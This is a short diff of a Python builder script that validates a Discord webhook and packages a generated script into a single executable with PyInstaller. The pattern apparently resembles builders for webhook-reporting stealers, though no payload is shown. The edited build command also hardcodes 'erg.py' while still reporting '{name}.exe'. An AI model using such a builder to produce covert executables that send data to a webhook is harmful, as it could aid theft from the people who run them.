@@ -29,7 +29,7 @@ while True:
             
             re = requests.get(Webhook)
             if re.status_code == 200 and ('discord.com' in Webhook or 'discordapp.com' in Webhook):
-                print('Valid Webhook')
+                print('\033[92mValid Webhook\033[0m')
                 break
             else:
                 print('Invalid Webhook')
@@ -127,8 +127,9 @@ while True:
             command = [
                 'pyinstaller',
                 '--onefile',
-                f'--distpath Build',  
-                f'./Build/{name}.py'
+                '--distpath',
+                './Build',  
+                './Build/erg.py'
             ]
             subprocess.run(command, check=True)
             input(f'File {name}.exe successfully created press any key to quit')
